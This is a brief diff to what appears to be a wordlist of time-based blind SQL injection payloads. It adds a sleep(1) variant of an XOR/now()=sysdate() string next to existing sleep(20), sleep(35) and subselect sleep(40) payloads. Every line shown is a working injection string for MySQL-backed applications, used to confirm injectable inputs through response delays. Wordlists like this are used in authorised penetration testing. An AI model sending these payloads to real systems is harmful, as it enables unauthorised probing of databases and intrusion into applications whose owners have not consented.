@@ -1,6 +1,7 @@
 
 '(select*from(select(sleep(40)))a)+
 
+0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
 
 0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z
